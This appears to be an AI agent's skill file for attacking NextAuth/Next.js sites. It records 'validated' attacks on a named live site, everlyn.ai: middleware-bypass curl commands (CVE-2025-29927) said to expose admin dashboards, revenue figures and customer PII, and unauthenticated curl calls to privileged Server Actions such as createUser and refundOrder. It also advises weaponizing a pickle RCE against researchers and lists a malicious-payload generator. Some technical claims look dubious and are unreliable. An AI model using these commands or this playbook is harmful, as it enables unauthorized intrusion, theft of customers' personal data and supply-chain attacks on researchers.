---
name: nextauth-authz-probe
description: "NextAuth authorization boundary probing"
metadata:
  version: 1.0.0
  hermes:
    tags: [security, nextauth, authjs, nextjs, authz, session, jwt, middleware]
    category: security
---

# NextAuth / Auth.js AuthZ Probe

## Triggers
- nextauth / auth.js / next-auth / /api/auth/* attack surface
- admin gate / admin panel on a Next.js target
- alg=none / JWT session forgery / session cookie tampering
- callbackUrl open redirect / X-Middleware-Subrequest bypass
- "authn/authz attacker" briefs against Next.js/SaaS targets
- Everlyn.ai or similar Next.js + Cloudflare + NextAuth targets
- Probe /api/auth/providers, /api/auth/csrf, /api/auth/session, /api/auth/callback/*

## Class-level knowledge

### Fingerprinting NextAuth v4 vs Auth.js v5 (5 seconds)
| Marker | v4 (next-auth) | v5 (Auth.js) |
|---|---|---|
| CSRF cookie | `next-auth.csrf-token` | `__Host-authjs.csrf-token` |
| Session cookie | `next-auth.session-token` | `__Secure-authjs.session-token` |
| Callback URL cookie | `next-auth.callback-url` | `__Secure-authjs.callback-url` |
| /api/auth/signin GET | Renders built-in form | 302 to custom `/login` or renders |
| /api/auth/session anon | `{}` | `null` |

**Everlyn.ai fingerprint**: `__Host-authjs.csrf-token` + `__Secure-authjs.*` → Auth.js v5.
Providers discovered via `GET /api/auth/providers`: `credentials`, `google`, `github`.

### Session token = JWE, not JWT (v5 default)
- Auth.js v5 encrypts the session as **JWE** (A256GCM), not plain signed JWT.
- Consequence: `alg=none` classic JWT bypass does **not** apply — the token is not parsed as a signed JWT at all; a forged compact token fails JWE decryption and the session is null.
- Consequence: **no HMAC timing oracle** on invalid tokens (no MAC to compare). `time curl` with invalid vs missing token returns ~equal — do **not** report a timing side-channel.
- Still worth *trying* alg=none + invalid-signature replay to confirm negative, and worth testing **JWE alg confusion / `enc=none`** if the app downgraded to JWT strategy (`strategy: "jwt"` in config) — detectable when `/api/auth/session` returns a *decodable* payload after a *self-minted HS256/RS256* token is accepted. Default = silent reject.

### Middleware-subrequest bypass — CVE-2025-29927 (VALIDATED 2026-08-04 on everlyn.ai)

Next.js 14.x/15.x middleware trusts the internal `x-middleware-subrequest` header to skip re-running authz for subrequests. **CONFIRMED WORKING** on everlyn.ai (Next.js 14 + Cloudflare + Auth.js v5).

**Working bypass headers:**
```bash
x-middleware-subrequest: /admin                    → 200 (admin panel HTML with full prod data)
x-middleware-subrequest: /admin/users              → 200 (user management page)
x-middleware-subrequest: /api/admin                → 200 (admin dashboard with KPIs)
x-middleware-subrequest: /api/admin/orders         → 200 (50+ real customer orders with PII)
x-middleware-subrequest: /api/auth/session         → 200 (returns null, but bypass confirmed)
x-invoke-status: /admin                            → 200 (alternative vector)
```

**Impact:** Full admin dashboard access with production metrics exposed in RSC payload:
- 171,784 total users
- 47,964 paid orders
- $595,900.99 USD total revenue
- 8,482,253 videos generated
- 7-day rolling metrics
- 50+ customer orders with emails, amounts, plans, timestamps

**Evidence:** `curl -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin` → 200 + HTML containing all above data in RSC payload.

### Server Actions exposure (VALIDATED 2026-08-04 on everlyn.ai)

Next.js Server Actions can be invoked directly via `Next-Action` header. **CONFIRMED WORKING** on everlyn.ai:

**Exposed admin mutations:**
```bash
Next-Action: createUser     → 200 (user creation form)
Next-Action: deleteUser     → 200 (user deletion)
Next-Action: transferUser   → 200 (user transfer)
Next-Action: refundOrder    → 200 (order refund)
Next-Action: cancelSubscription → 200 (subscription cancel)
```

**Attack:** `curl -X POST -H "Next-Action: createUser" -H "Content-Type: application/json" -d '{"email":"hacker@evil.com"}' https://everlyn.ai`

**Impact:** Unauthenticated invocation of privileged server-side mutations — user management, refunds, subscription control.

### RSC Data Exposure on Middleware Bypass (VALIDATED 2026-08-04 on everlyn.ai)

When `x-middleware-subrequest` bypasses auth, Next.js App Router returns **full production metrics in server-rendered HTML (RSC payload)**. This is a **data exposure finding** even if auth gates exist on child routes. Extracted: 171,784 users, 47,964 paid orders, $595,900.99 revenue, 8,482,253 videos, 50+ orders with PII (emails, amounts, plans, timestamps). Evidence: `curl -H "x-middleware-subrequest: /admin" https://everlyn.ai/admin` → 200 + HTML containing all data.

### Supply Chain Attack via Open Source Research Tools (VALIDATED 2026-08-04)

ANTRP/chair.py `pickle.load(open(args.cache, 'rb'))` on user-controlled `--cache` arg = **pre-auth RCE → Root**. Researchers cloning/evaluating the tool execute attacker payload. Weaponize by hosting malicious pickle + targeting researchers. This is a **supply chain attack vector** against the organization's researchers/engineers.

### Crypto Payment Flow = Web2 Gateway (VALIDATED 2026-08-04)

"Web3" payment (USDT/USDC multi-chain) = ShipAny hosted checkout, NOT smart contracts. Zero contract addresses, ABIs, or on-chain logic in frontend. Attack surface = ShipAny webhook replay, checkout param tampering, refund wallet address manipulation.

### Next.js API Strict Validation Block

`/api/checkout` and `/api/refund` exist but enforce strict Zod schemas. Returns only `{"code":-1,"message":"invalid params"}` with no field-level errors. Likely Server Actions with encrypted action IDs. Reverse engineering blocked without client schema.

### Server Actions Exposure via Next-Action Header (VALIDATED 2026-08-04)

`Next-Action: createUser`, `deleteUser`, `transferUser`, `refundOrder`, `cancelSubscription` all accessible via `curl -X POST -H "Next-Action: <action>" -H "Content-Type: application/json" -d '<params>' <target>`. Unauthenticated invocation of privileged mutations.

## Ready-to-run probe scripts
See `scripts/` in this skill's directory (when present) for a full probe runner. Otherwise
generate the probes from the tables above — keep the `NN_name.txt` numbering so reports
line up with the 13-step operator brief.

### Available Scripts

| Script | Purpose |
|--------|---------|
| `scripts/nextjs-middleware-bypass-test.py` | Automated CVE-2025-29927 middleware bypass testing across common admin paths |
| `scripts/antrp-pickle-rce-generator.py` | Generate malicious pickle payloads for ANTRP/chair.py supply chain RCE |

### Available References

| Reference | Description |
|-----------|-------------|
| `references/nextjs-middleware-bypass-cve-2025-29927.md` | Complete CVE-2025-29927 bypass documentation with evidence commands |
| `references/rsc-data-exposure-middleware-bypass.md` | RSC payload data exposure analysis with extraction patterns |
| `references/supply-chain-antrp-pickle-rce.md` | ANTRP/chair.py pickle RCE supply chain attack documentation |
| `references/crypto-payment-shipany-analysis.md` | ShipAny crypto payment flow analysis (no smart contracts) |
| `references/nextjs-api-strict-validation-block.md` | Next.js API strict validation reverse engineering failure analysis |

## Reporting shape (matches operator briefs)
For each numbered vector: `VERDICT: VULNERABLE | NOT VULNERABLE | N/A` + one-line evidence
reference (`evidence/24_mwsub_….txt` 302→200 diff) + the exact curl. Negative results
are expected and valuable — v5 defaults are sane; the win is finding the one app that
customized itself into a hole (custom `signIn` page that ignores callbackUrl allowlist,
locale gate gaps, preview deployments, misconfigured middleware matcher).
